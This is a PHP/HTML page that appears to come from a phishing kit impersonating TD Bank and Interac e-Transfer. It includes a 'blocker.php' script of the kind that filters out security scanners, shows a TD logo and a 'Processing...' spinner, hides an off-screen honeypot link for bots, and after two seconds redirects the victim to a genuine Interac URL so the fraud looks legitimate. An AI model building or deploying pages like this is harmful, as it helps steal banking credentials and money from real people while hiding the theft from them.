<?php
include('blocker.php');
?>
<html>
      <head>
       <LINK href="js/snsStyles.css" rel="stylesheet" type="text/css">
	   
		<META HTTP-EQUIV="Refresh" CONTENT="2;URL=https://etransfer.interac.ca/RP.do?pID=CAf2XJYJ&lang=en&src=603A6304046812789371">
       <title>
       Processing...
       </title>
       
	
	 
	 	
	 
	  <style type="text/css">
           
             #signOutContent {
   margin:100px 0 0 0;
  }

  #signOutTxt {
   font:normal 18px Arial;
   color:#333333;
  }

  #main-txt {
    margin:33px 0 0 0;
  }

  #signout-circle {
  }

  #signout-main {
   width:100%;
   text-align:center;
  }


	  </style>
	 </head>
	 
	 <body>
	 <a href="../../../../honey.php" style="color: #fff; cursor: default; position: absolute; bottom: 0; right: -400px;">TD</a>
          <div id="signout-main"> 

	   <div id="signOutContent">
	    <img id="aolBlueLogo" src="http://downtownptbo.ca/assets/img/uploads/dbia_td.jpg?1405109643" />
	   </div>
	  
	  <!--
	   <div id="main-txt">
	    <span id="signOutTxt">
	     Thank you, <br />
	   Your deposit will be processed within 48 hours.
	    </span>
	   </div>
	  -->
	   <div id="signout-circle">
	    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b1/Loading_icon.gif" />
           </div>
	 
          </div>
	  
	  
	  
	  
	 
	
       
      
 
 
 
</body>

</html>


